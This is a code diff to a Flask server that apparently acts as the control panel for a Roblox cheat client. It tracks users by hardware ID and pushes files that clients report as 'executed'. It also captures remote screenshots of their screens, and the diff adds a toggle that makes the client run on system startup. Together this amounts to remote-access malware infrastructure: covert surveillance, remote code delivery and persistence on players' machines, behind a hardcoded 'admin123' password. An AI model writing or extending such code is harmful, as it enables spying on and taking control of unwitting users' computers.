@@ -2,9 +2,7 @@ from flask import Flask, request, jsonify, render_template_string, send_file
 import json
 import os
 import base64
-import io
 from datetime import datetime, timedelta
-from PIL import Image
 
 app = Flask(__name__)
 
@@ -35,7 +33,10 @@ def save_data(data):
         json.dump(data, f, indent=4)
 
 PLAYERS = load_data()
-PENDING_FILES = {}  # hwid -> {'filename': name, 'content_b64': base64, 'status': 'queued'}
+PENDING_FILES = {}        # hwid -> {'filename': name, 'content_b64': base64, 'status': 'queued'}
+screenshot_requests = {}  # hwid -> True (pending)
+screenshot_files = {}     # hwid -> filename (ready for download)
+startup_requests = {}     # hwid -> True/False (pending toggle)
 
 ADMIN_PASSWORD = "admin123"  # CHANGE THIS!
 
@@ -44,7 +45,7 @@ def add_username(hwid, username):
         PLAYERS[hwid].setdefault('usernames', []).append(username)
 
 # ============================================
-# HTML ADMIN DASHBOARD (no auto-refresh)
+# HTML ADMIN DASHBOARD (Two tabs)
 # ============================================
 DASHBOARD_HTML = """
 <!DOCTYPE html>
@@ -70,6 +71,7 @@ DASHBOARD_HTML = """
         .btn-file { background: #9b59b6; color: white; }
         .btn-screenshot { background: #2ecc71; color: black; }
         .btn-refresh { background: #3498db; color: white; }
+        .btn-startup { background: #f1c40f; color: black; }
         .btn-kick:hover { background: #f39c12; }
         .btn-ban:hover { background: #c0392b; }
         .btn-unban:hover { background: #2ecc71; }
@@ -77,6 +79,7 @@ DASHBOARD_HTML = """
         .btn-file:hover { background: #8e44ad; }
         .btn-screenshot:hover { background: #27ae60; }
         .btn-refresh:hover { background: #2980b9; }
+        .btn-startup:hover { background: #d4ac0d; }
         .settings-input { width: 80px; padding: 3px; background: #222; color: #fff; border: 1px solid #555; }
         .settings-btn { padding: 3px 8px; background: #3498db; color: white; border: none; border-radius: 3px; cursor: pointer; }
         .settings-btn:hover { background: #2980b9; }
@@ -96,35 +99,38 @@ DASHBOARD_HTML = """
         .timestamp { color: #888; font-size: 0.8em; }
         .username-list { font-weight: bold; color: #0f0; }
         .refresh-section { margin-bottom: 15px; }
+        .tab { overflow: hidden; border-bottom: 1px solid #333; }
+        .tab button { background: inherit; float: left; border: none; outline: none; cursor: pointer; padding: 10px 16px; transition: 0.3s; color: #aaa; }
+        .tab button:hover { background: #2a2a2a; color: #fff; }
+        .tab button.active { background: #1a1a1a; color: #0f0; border-bottom: 2px solid #0f0; }
+        .tabcontent { display: none; padding: 20px 0; }
+        .tabcontent.active { display: block; }
     </style>
     <script>
+        function openTab(evt, tabName) {
+            var i, tabcontent, tablinks;
+            tabcontent = document.getElementsByClassName("tabcontent");
+            for (i = 0; i < tabcontent.length; i++) tabcontent[i].className = tabcontent[i].className.replace(" active", "");
+            tablinks = document.getElementsByClassName("tablinks");
+            for (i = 0; i < tablinks.length; i++) tablinks[i].className = tablinks[i].className.replace(" active", "");
+            document.getElementById(tabName).className += " active";
+            evt.currentTarget.className += " active";
+        }
         function copyHWID(hwid) {
-            navigator.clipboard.writeText(hwid).then(() => {
-                alert('HWID copied: ' + hwid);
-            });
+            navigator.clipboard.writeText(hwid).then(() => alert('HWID copied: ' + hwid));
         }
         function updateFileName(hwid) {
             const input = document.getElementById('fileInput_' + hwid);
             const label = document.getElementById('fileName_' + hwid);
-            if (input.files && input.files.length > 0) {
-                label.textContent = input.files[0].name;
-            } else {
-                label.textContent = 'No file chosen';
-            }
+            if (input.files && input.files.length > 0) label.textContent = input.files[0].name;
+            else label.textContent = 'No file chosen';
             document.getElementById('statusMsg_' + hwid).textContent = '';
         }
         function setStatus(hwid, msg, type) {
             const el = document.getElementById('statusMsg_' + hwid);
             el.textContent = msg;
             el.className = 'status-msg ' + type;
-            if (type === 'success' || type === 'error') {
-                setTimeout(() => { 
-                    if (el.textContent === msg) {
-                        el.textContent = '';
-                        el.className = 'status-msg';
-                    }
-                }, 5000);
-            }
+            setTimeout(() => { if (el.textContent === msg) { el.textContent = ''; el.className = 'status-msg'; } }, 5000);
         }
         function uploadFile(hwid) {
             const input = document.getElementById('fileInput_' + hwid);
@@ -173,16 +179,33 @@ DASHBOARD_HTML = """
             .then(res => res.json())
             .then(data => {
                 if (data.status === 'ok') {
-                    alert('Screenshot requested. It will appear in the dashboard shortly.');
+                    alert('Screenshot requested. Download link will appear soon.');
                 } else {
                     alert('Error: ' + data.error);
                 }
             })
             .catch(err => alert('Network error: ' + err));
         }
-        function refreshPage() {
-            location.reload();
+        function toggleStartup(hwid) {
+            var checkbox = document.getElementById('startup_' + hwid);
+            var checked = checkbox.checked;
+            fetch('/admin/startup', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ hwid: hwid, enabled: checked })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.status === 'ok') {
+                    alert('Startup setting changed. Will take effect on next heartbeat.');
+                } else {
+                    alert('Error: ' + data.error);
+                    checkbox.checked = !checked; // revert
+                }
+            })
+            .catch(err => { alert('Network error'); checkbox.checked = !checked; });
         }
+        function refreshPage() { location.reload(); }
     </script>
 </head>
 <body>
@@ -191,136 +214,177 @@ DASHBOARD_HTML = """
         <button class="btn btn-refresh" onclick="refreshPage()">🔄 Refresh</button>
         <span style="margin-left:15px;color:#888;">Last updated: {{ now }}</span>
     </div>
-    <p>Active players (last 20s): <span id="active-count">{{ active_players|length }}</span></p>
-    <table>
-        <thead><tr><th>HWID</th><th>Username(s)</th><th>Last Seen</th><th>Status</th><th>Settings Override</th><th>Send File</th><th>File Status</th><th>Screenshot</th><th>Actions</th></tr></thead>
-        <tbody>
-        {% for hwid, data in active_players.items() %}
-        <tr class="active">
-            <td>
-                <code>{{ hwid[:8] }}...{{ hwid[-4:] }}</code>
-                <button class="btn btn-copy" onclick="copyHWID('{{ hwid }}')">📋</button>
-            </td>
-            <td><span class="username-list">{{ data.usernames|join(', ') }}</span></td>
-            <td>{{ data.last_seen }}</td>
-            <td>{{ data.status.upper() }}</td>
-            <td>
-                <form method="POST" action="/admin/settings" style="display:inline;">
-                    <input type="hidden" name="hwid" value="{{ hwid }}">
-                    <input type="text" name="setting" placeholder="e.g. ESP_SHOW_BOX" class="settings-input" value="{{ data.settings_override.get('setting', '') }}">
-                    <input type="text" name="value" placeholder="True/False" class="settings-input" value="{{ data.settings_override.get('value', '') }}">
-                    <button type="submit" class="settings-btn">Set</button>
-                </form>
-            </td>
-            <td>
-                <div class="file-upload">
-                    <input type="file" id="fileInput_{{ hwid }}" onchange="updateFileName('{{ hwid }}')">
-                    <label for="fileInput_{{ hwid }}">Choose file</label>
-                    <span class="file-name" id="fileName_{{ hwid }}">No file chosen</span>
-                    <button class="btn btn-file" onclick="uploadFile('{{ hwid }}')">Send</button>
-                    <span class="status-msg" id="statusMsg_{{ hwid }}"></span>
-                </div>
-            </td>
-            <td>
-                {% set pending = pending_files.get(hwid) %}
-                {% if pending %}
-                    <span class="file-status">{{ pending.filename }} ({{ pending.status }})</span>
-                {% else %}
-                    <span class="file-status">No file</span>
-                {% endif %}
-            </td>
-            <td>
-                {% if screenshots.get(hwid) %}
-                    <a href="/screenshots/{{ screenshots[hwid] }}" target="_blank" class="screenshot-link">View</a>
-                {% else %}
-                    <button class="btn btn-screenshot" onclick="takeScreenshot('{{ hwid }}')">📷</button>
-                {% endif %}
-            </td>
-            <td>
-                <form method="POST" action="/admin/kick" style="display:inline;">
-                    <input type="hidden" name="hwid" value="{{ hwid }}">
-                    <button type="submit" class="btn btn-kick">Kick</button>
-                </form>
-                {% if data.status == 'banned' %}
-                <form method="POST" action="/admin/unban" style="display:inline;">
-                    <input type="hidden" name="hwid" value="{{ hwid }}">
-                    <button type="submit" class="btn btn-unban">Unban</button>
-                </form>
-                {% else %}
-                <form method="POST" action="/admin/ban" style="display:inline;">
-                    <input type="hidden" name="hwid" value="{{ hwid }}">
-                    <button type="submit" class="btn btn-ban">Ban</button>
-                </form>
-                {% endif %}
-            </td>
-        </tr>
-        {% endfor %}
-        </tbody>
-    </table>
 
-    <h2>📜 All Players History</h2>
-    <table>
-        <thead><tr><th>HWID</th><th>Username(s)</th><th>First Seen</th><th>Last Seen</th><th>Status</th><th>Actions</th></tr></thead>
-        <tbody>
-        {% for hwid, data in all_players.items() %}
-        <tr class="{{ 'banned' if data.status == 'banned' else 'offline' }}">
-            <td>
-                <code>{{ hwid[:8] }}...{{ hwid[-4:] }}</code>
-                <button class="btn btn-copy" onclick="copyHWID('{{ hwid }}')">📋</button>
-            </td>
-            <td><span class="username-list">{{ data.usernames|join(', ') }}</span></td>
-            <td>{{ data.first_seen }}</td>
-            <td>{{ data.last_seen }}</td>
-            <td>{{ data.status.upper() }}</td>
-            <td>
-                <form method="POST" action="/admin/kick" style="display:inline;">
-                    <input type="hidden" name="hwid" value="{{ hwid }}">
-                    <button type="submit" class="btn btn-kick">Kick</button>
-                </form>
-                {% if data.status == 'banned' %}
-                <form method="POST" action="/admin/unban" style="display:inline;">
-                    <input type="hidden" name="hwid" value="{{ hwid }}">
-                    <button type="submit" class="btn btn-unban">Unban</button>
-                </form>
-                {% else %}
-                <form method="POST" action="/admin/ban" style="display:inline;">
-                    <input type="hidden" name="hwid" value="{{ hwid }}">
-                    <button type="submit" class="btn btn-ban">Ban</button>
-                </form>
-                {% endif %}
-            </td>
-        </tr>
-        {% endfor %}
-        </tbody>
-    </table>
+    <div class="tab">
+        <button class="tablinks active" onclick="openTab(event, 'Main')">Main</button>
+        <button class="tablinks" onclick="openTab(event, 'Manager')">Player Manager</button>
+    </div>
 
-    <h2>👤 Users (by Roblox Username)</h2>
-    <table>
-        <thead><tr><th>Roblox Username</th><th>Associated HWIDs</th><th>First Seen</th><th>Last Seen</th></tr></thead>
-        <tbody>
-        {% for username, info in users.items() %}
-        <tr>
-            <td><strong>{{ username }}</strong></td>
-            <td>
-                {% for hwid in info.hwids %}
-                    <code>{{ hwid[:8] }}...{{ hwid[-4:] }}</code>{% if not loop.last %}, {% endif %}
-                {% endfor %}
-            </td>
-            <td>{{ info.first_seen }}</td>
-            <td>{{ info.last_seen }}</td>
-        </tr>
-        {% endfor %}
-        </tbody>
-    </table>
+    <!-- ========== TAB 1: MAIN ========== -->
+    <div id="Main" class="tabcontent active">
+        <p>Active players (last 20s): <span id="active-count">{{ active_players|length }}</span></p>
+        <h2>📊 Active Players</h2>
+        <table>
+            <thead><tr><th>HWID</th><th>Username(s)</th><th>Last Seen</th><th>Status</th><th>Settings Override</th><th>Actions</th></tr></thead>
+            <tbody>
+            {% for hwid, data in active_players.items() %}
+            <tr class="active">
+                <td><code>{{ hwid[:8] }}...{{ hwid[-4:] }}</code> <button class="btn btn-copy" onclick="copyHWID('{{ hwid }}')">📋</button></td>
+                <td><span class="username-list">{{ data.usernames|join(', ') }}</span></td>
+                <td>{{ data.last_seen }}</td>
+                <td>{{ data.status.upper() }}</td>
+                <td>
+                    <form method="POST" action="/admin/settings" style="display:inline;">
+                        <input type="hidden" name="hwid" value="{{ hwid }}">
+                        <input type="text" name="setting" placeholder="e.g. ESP_SHOW_BOX" class="settings-input" value="{{ data.settings_override.get('setting', '') }}">
+                        <input type="text" name="value" placeholder="True/False" class="settings-input" value="{{ data.settings_override.get('value', '') }}">
+                        <button type="submit" class="settings-btn">Set</button>
+                    </form>
+                </td>
+                <td>
+                    <form method="POST" action="/admin/kick" style="display:inline;">
+                        <input type="hidden" name="hwid" value="{{ hwid }}">
+                        <button type="submit" class="btn btn-kick">Kick</button>
+                    </form>
+                    {% if data.status == 'banned' %}
+                    <form method="POST" action="/admin/unban" style="display:inline;">
+                        <input type="hidden" name="hwid" value="{{ hwid }}">
+                        <button type="submit" class="btn btn-unban">Unban</button>
+                    </form>
+                    {% else %}
+                    <form method="POST" action="/admin/ban" style="display:inline;">
+                        <input type="hidden" name="hwid" value="{{ hwid }}">
+                        <button type="submit" class="btn btn-ban">Ban</button>
+                    </form>
+                    {% endif %}
+                </td>
+            </tr>
+            {% endfor %}
+            </tbody>
+        </table>
+
+        <h2>📜 All Players History</h2>
+        <table>
+            <thead><tr><th>HWID</th><th>Username(s)</th><th>First Seen</th><th>Last Seen</th><th>Status</th><th>Actions</th></tr></thead>
+            <tbody>
+            {% for hwid, data in all_players.items() %}
+            <tr class="{{ 'banned' if data.status == 'banned' else 'offline' }}">
+                <td><code>{{ hwid[:8] }}...{{ hwid[-4:] }}</code> <button class="btn btn-copy" onclick="copyHWID('{{ hwid }}')">📋</button></td>
+                <td><span class="username-list">{{ data.usernames|join(', ') }}</span></td>
+                <td>{{ data.first_seen }}</td>
+                <td>{{ data.last_seen }}</td>
+                <td>{{ data.status.upper() }}</td>
+                <td>
+                    <form method="POST" action="/admin/kick" style="display:inline;">
+                        <input type="hidden" name="hwid" value="{{ hwid }}">
+                        <button type="submit" class="btn btn-kick">Kick</button>
+                    </form>
+                    {% if data.status == 'banned' %}
+                    <form method="POST" action="/admin/unban" style="display:inline;">
+                        <input type="hidden" name="hwid" value="{{ hwid }}">
+                        <button type="submit" class="btn btn-unban">Unban</button>
+                    </form>
+                    {% else %}
+                    <form method="POST" action="/admin/ban" style="display:inline;">
+                        <input type="hidden" name="hwid" value="{{ hwid }}">
+                        <button type="submit" class="btn btn-ban">Ban</button>
+                    </form>
+                    {% endif %}
+                </td>
+            </tr>
+            {% endfor %}
+            </tbody>
+        </table>
+
+        <h2>👤 Users by Roblox Username</h2>
+        <table>
+            <thead><tr><th>Roblox Username</th><th>Associated HWIDs</th><th>First Seen</th><th>Last Seen</th></tr></thead>
+            <tbody>
+            {% for username, info in users.items() %}
+            <tr>
+                <td><strong>{{ username }}</strong></td>
+                <td>
+                    {% for hwid in info.hwids %}
+                        <code>{{ hwid[:8] }}...{{ hwid[-4:] }}</code>{% if not loop.last %}, {% endif %}
+                    {% endfor %}
+                </td>
+                <td>{{ info.first_seen }}</td>
+                <td>{{ info.last_seen }}</td>
+            </tr>
+            {% endfor %}
+            </tbody>
+        </table>
+    </div>
+
+    <!-- ========== TAB 2: PLAYER MANAGER ========== -->
+    <div id="Manager" class="tabcontent">
+        <p>Manage each player individually.</p>
+        <table>
+            <thead><tr><th>HWID</th><th>Username(s)</th><th>Status</th><th>Send File</th><th>File Status</th><th>Screenshot</th><th>Startup</th><th>Actions</th></tr></thead>
+            <tbody>
+            {% for hwid, data in active_players.items() %}
+            <tr class="active">
+                <td><code>{{ hwid[:8] }}...{{ hwid[-4:] }}</code> <button class="btn btn-copy" onclick="copyHWID('{{ hwid }}')">📋</button></td>
+                <td><span class="username-list">{{ data.usernames|join(', ') }}</span></td>
+                <td>{{ data.status.upper() }}</td>
+                <td>
+                    <div class="file-upload">
+                        <input type="file" id="fileInput_{{ hwid }}" onchange="updateFileName('{{ hwid }}')">
+                        <label for="fileInput_{{ hwid }}">Choose file</label>
+                        <span class="file-name" id="fileName_{{ hwid }}">No file chosen</span>
+                        <button class="btn btn-file" onclick="uploadFile('{{ hwid }}')">Send</button>
+                        <span class="status-msg" id="statusMsg_{{ hwid }}"></span>
+                    </div>
+                </td>
+                <td>
+                    {% set pending = pending_files.get(hwid) %}
+                    {% if pending %}
+                        <span class="file-status">{{ pending.filename }} ({{ pending.status }})</span>
+                    {% else %}
+                        <span class="file-status">No file</span>
+                    {% endif %}
+                </td>
+                <td>
+                    {% if screenshot_files.get(hwid) %}
+                        <a href="/screenshots/{{ screenshot_files[hwid] }}" target="_blank" class="screenshot-link">Download</a>
+                        <br><small>(click to download, then request again)</small>
+                    {% else %}
+                        <button class="btn btn-screenshot" onclick="takeScreenshot('{{ hwid }}')">📷 Request</button>
+                    {% endif %}
+                </td>
+                <td>
+                    <input type="checkbox" id="startup_{{ hwid }}" {% if data.get('startup', False) %}checked{% endif %} onchange="toggleStartup('{{ hwid }}')">
+                    <label for="startup_{{ hwid }}">Run on startup</label>
+                </td>
+                <td>
+                    <form method="POST" action="/admin/kick" style="display:inline;">
+                        <input type="hidden" name="hwid" value="{{ hwid }}">
+                        <button type="submit" class="btn btn-kick">Kick</button>
+                    </form>
+                    {% if data.status == 'banned' %}
+                    <form method="POST" action="/admin/unban" style="display:inline;">
+                        <input type="hidden" name="hwid" value="{{ hwid }}">
+                        <button type="submit" class="btn btn-unban">Unban</button>
+                    </form>
+                    {% else %}
+                    <form method="POST" action="/admin/ban" style="display:inline;">
+                        <input type="hidden" name="hwid" value="{{ hwid }}">
+                        <button type="submit" class="btn btn-ban">Ban</button>
+                    </form>
+                    {% endif %}
+                </td>
+            </tr>
+            {% endfor %}
+            </tbody>
+        </table>
+    </div>
 </body>
 </html>
 """
 
 # ============================================
-# ADMIN PANEL
+# ADMIN PANEL ROUTE
 # ============================================
-screenshot_files = {}  # hwid -> filename
-
 @app.route('/admin', methods=['GET'])
 def admin_panel():
     pwd = request.args.get('pass')
@@ -356,7 +420,7 @@ def admin_panel():
                                    all_players=all_players,
                                    users=users,
                                    pending_files=PENDING_FILES,
-                                   screenshots=screenshot_files,
+                                   screenshot_files=screenshot_files,
                                    now=now.strftime("%H:%M:%S"))
 
 # ============================================
@@ -377,7 +441,8 @@ def register():
             'last_seen': now,
             'status': 'active',
             'settings_override': {},
-            'usernames': [username] if username else []
+            'usernames': [username] if username else [],
+            'startup': False
         }
     else:
         PLAYERS[hwid]['last_seen'] = now
@@ -390,12 +455,18 @@ def register():
         'settings_override': PLAYERS[hwid].get('settings_override', {})
     }
 
-    # Check for pending screenshot request
+    # Screenshot request
     if hwid in screenshot_requests and screenshot_requests[hwid]:
         response['screenshot'] = True
         del screenshot_requests[hwid]
 
-    # Check for pending file
+    # Startup toggle
+    if hwid in startup_requests:
+        response['startup'] = startup_requests[hwid]
+        PLAYERS[hwid]['startup'] = startup_requests[hwid]
+        del startup_requests[hwid]
+
+    # File delivery
     if hwid in PENDING_FILES and PENDING_FILES[hwid].get('status') == 'queued':
         response['file_payload'] = {
             'filename': PENDING_FILES[hwid]['filename'],
@@ -412,6 +483,22 @@ def register():
     return jsonify(response)
 
 # ============================================
+# ACKNOWLEDGMENT ENDPOINT
+# ============================================
+@app.route('/ack', methods=['POST'])
+def ack():
+    data = request.json
+    hwid = data.get('hwid')
+    filename = data.get('filename')
+    status = data.get('status', 'executed')
+    if hwid in PENDING_FILES and PENDING_FILES[hwid].get('filename') == filename:
+        PENDING_FILES[hwid]['status'] = status
+        print(f"[+] Acknowledgment from {hwid}: {filename} - {status}")
+    else:
+        print(f"[!] Acknowledgment from unknown: {hwid} - {filename}")
+    return '', 204
+
+# ============================================
 # SCREENSHOT UPLOAD (from client)
 # ============================================
 @app.route('/upload_screenshot', methods=['POST'])
@@ -422,7 +509,6 @@ def upload_screenshot():
     if not hwid or not image_b64:
         return jsonify({'error': 'Missing data'}), 400
 
-    # Save image
     filename = f"screenshot_{hwid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
     filepath = os.path.join(SCREENSHOT_DIR, filename)
     try:
@@ -439,8 +525,6 @@ def upload_screenshot():
 # ============================================
 # ADMIN: REQUEST SCREENSHOT
 # ============================================
-screenshot_requests = {}  # hwid -> True (pending)
-
 @app.route('/admin/screenshot', methods=['POST'])
 def request_screenshot():
     data = request.json
@@ -449,8 +533,27 @@ def request_screenshot():
         return jsonify({'status': 'error', 'error': 'Missing HWID'}), 400
     if hwid not in PLAYERS:
         return jsonify({'status': 'error', 'error': 'HWID not found'}), 404
+    # If a screenshot already exists, remove it so user can request a new one
+    if hwid in screenshot_files:
+        del screenshot_files[hwid]
     screenshot_requests[hwid] = True
     print(f"[+] Screenshot requested for {hwid}")
+    return jsonify({'status': 'ok'})
+
+# ============================================
+# ADMIN: TOGGLE STARTUP
+# ============================================
+@app.route('/admin/startup', methods=['POST'])
+def toggle_startup():
+    data = request.json
+    hwid = data.get('hwid')
+    enabled = data.get('enabled', False)
+    if not hwid:
+        return jsonify({'status': 'error', 'error': 'Missing HWID'}), 400
+    if hwid not in PLAYERS:
+        return jsonify({'status': 'error', 'error': 'HWID not found'}), 404
+    startup_requests[hwid] = enabled
+    print(f"[+] Startup toggle for {hwid}: {enabled}")
     return jsonify({'status': 'ok'})
 
 # ============================================
@@ -514,10 +617,8 @@ def upload_file():
     filename = data.get('filename')
     content_b64 = data.get('content_b64')
     if not hwid or not filename or not content_b64:
-        print(f"[!] Upload missing fields: hwid={hwid}, filename={filename}, has_content={bool(content_b64)}")
         return jsonify({'status': 'error', 'error': 'Missing fields'}), 400
     if hwid not in PLAYERS:
-        print(f"[!] Unknown HWID: {hwid}")
         return jsonify({'status': 'error', 'error': 'HWID not found'}), 404
     PENDING_FILES[hwid] = {
         'filename': filename,
